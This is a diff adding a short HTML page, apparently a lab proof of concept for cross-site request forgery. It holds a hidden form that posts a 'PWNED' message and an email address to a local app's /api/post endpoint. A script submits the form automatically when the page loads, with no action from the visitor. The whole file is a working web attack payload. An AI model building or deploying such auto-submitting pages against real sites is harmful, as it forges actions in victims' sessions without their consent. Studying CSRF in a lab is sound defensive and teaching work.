@@ -1,0 +1,19 @@
+<html>
+
+<head>
+    the baddest site
+</head>
+
+<body>
+    <form action="http://localhost:3000/api/post" method="POST" id="csrf-form">
+        <input type="hidden" name="title" value="PWNED" />
+        <input type="hidden" name="content" value="you were hacked!" />
+        <input type="hidden" name="email" value="uriziv10@gmail.com" />
+    </form>
+    <h1>PWNED</h1>
+    <script>
+        document.forms[0].submit()
+    </script>
+</body>
+
+</html>
